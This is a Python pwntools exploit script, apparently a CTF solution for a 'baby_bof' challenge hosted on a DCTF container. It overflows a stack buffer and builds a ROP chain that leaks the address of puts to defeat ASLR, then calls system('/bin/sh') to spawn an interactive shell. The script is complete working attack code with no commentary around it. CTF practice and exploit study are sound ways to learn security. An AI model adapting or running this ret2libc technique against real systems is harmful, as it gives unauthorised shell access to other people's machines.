from pwn import *
from sys import *

elf = ELF('baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./baby_bof')
HOST = 'dctf-chall-baby-bof.westeurope.azurecontainer.io'
PORT = 7481

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

pop_rdi = 0x0000000000400683
ret = 0x000000000040048e

payload = b'A'*10
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.entry)
p.sendline(payload)
p.recvuntil(b'work\n')
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - libc.sym['puts']
print("LIBC(): ",hex(leak))

payload = b'A'*10
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(ret)
payload += p64(libc.sym['system'])
p.sendline(payload)
p.interactive()